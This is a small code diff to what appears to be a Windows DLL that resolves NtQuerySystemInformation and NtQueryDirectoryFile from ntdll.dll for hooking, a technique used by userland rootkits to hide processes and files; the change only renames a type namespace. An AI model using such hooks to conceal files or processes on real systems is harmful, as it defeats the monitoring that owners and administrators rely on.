@@ -161,9 +161,9 @@ BOOL __stdcall DllMain(
 		g_FileList = new vec::AnyVector;
 
 		// Get Function Addresses to Hook
-		hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
+		hk::NtQuerySystemInformation = (m_NtDll::NtQuerySystemInformation_t)
 			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
-		hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
+		hk::NtQueryDirectoryFile = (m_NtDll::NtQueryDirectoryFile_t)
 			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");
 
 		return true;
